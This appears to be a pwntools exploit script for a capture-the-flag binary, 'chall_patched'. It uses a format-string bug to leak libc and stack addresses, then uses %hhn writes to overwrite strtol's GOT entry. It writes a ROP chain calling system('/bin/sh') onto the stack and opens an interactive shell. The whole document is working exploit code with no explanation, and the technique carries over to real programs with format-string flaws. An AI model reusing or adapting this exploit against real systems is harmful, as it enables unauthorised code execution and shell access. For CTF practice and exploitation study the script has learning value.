#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./chall_patched")

def write(where, what):
    payload  = b""

    array = []

    for i in range(8):
        array.append((where + i, what & 0xff))
        what >>= 8

    array = sorted(array, key=lambda x: x[1])

    written = 0
    i = 49

    for address, value in array:
        payload += b"A" * (value - written)
        payload += f"%{i}$hhn".encode()

        written = value
        i += 1

    payload += b"A" * (312 - len(payload))

    for address, value in array:
        payload += p64(address)

    shell.sendlineafter(b">> ", payload)

payload = b"%11$sPWN" + p64(0x404030) # strtol@got

shell.sendlineafter(b">> ", payload)
libc_base = u64(shell.recvuntil(b"PWN")[:-3].ljust(8, b"\x00")) - 0x474e0

write(0x404030, libc_base + 0x44b70) # strtol@got = getenv@glibc

shell.sendlineafter(b">> ", b"%65$p")
rsp = int(shell.recvline().strip(), 16) - 0x110

write(rsp + 0, libc_base + 0x02a3e5) # pop rdi; ret,
write(rsp + 8, libc_base + 0x1d8678) # "/bin/sh"
write(rsp + 16, libc_base + 0x29139) # ret;
write(rsp + 24, libc_base + 0x50d70) # system()

write(0x404030, libc_base + 0x474e0) # strtol@got = strtol@glibc

shell.sendlineafter(b">> ", b"%58$p")
shell.interactive()